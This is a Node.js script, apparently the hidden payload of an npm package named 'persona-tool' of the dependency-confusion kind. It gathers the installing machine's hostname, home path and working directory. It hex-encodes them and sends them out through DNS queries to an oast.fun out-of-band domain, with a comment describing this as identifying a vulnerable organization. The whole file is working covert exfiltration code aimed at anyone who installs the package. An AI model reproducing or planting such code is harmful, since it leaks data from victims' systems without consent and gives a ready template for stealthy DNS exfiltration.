const dns = require('dns');
const crypto = require('crypto');
const os = require('os');
const path = require('path');

const suffix = '.dns.fmcrifgjyoeeaahdavxvjm44hxuke3q0t.oast.fun';
const ns = 'dns1.fmcrifgjyoeeaahdavxvjm44hxuke3q0t.oast.fun';

const package = 'persona-tool';

// Only the bare minimum to be able to identify a vulnerable organization
const data = {
    p: package,
    h: os.hostname(),
    d: path.resolve('~'),
    c: process.cwd()
};

// Convert data to JSON, then to hexadecimal string, and split into chunks
const jsonData = JSON.stringify(data);
const hexData = Buffer.from(jsonData).toString('hex');
const chunks = hexData.match(/.{1,60}/g);

const id1 = crypto.randomBytes(6).toString('hex');
const id2 = crypto.randomBytes(6).toString('hex');

const resolveDns = (hostname, resolver) => {
    return new Promise((resolve, reject) => {
        dns.resolve4(hostname, {resolver}, (err) => {
            if (err) reject(err);
            else resolve();
        });
    });
};

const nsIpPromise = new Promise((resolve) => {
    dns.resolve4(ns, (err, addresses) => {
        if (err) resolve('8.8.4.4');
        else resolve(addresses[0]);
    });
});

nsIpPromise.then(nsIp => {
    const resolver = [nsIp, '8.8.8.8'];

    chunks.forEach((chunk, idx) => {
        const host1 = `v2_f.${id1}.${idx}.${chunk}.v2_e${suffix}`;
        const host2 = `v2_f.${id2}.${idx}.${chunk}.v2_e${suffix}`;

        // Attempt DNS resolution
        resolveDns(host1, resolver).catch(() => {});
        resolveDns(host2, resolver).catch(() => {});
    });
});

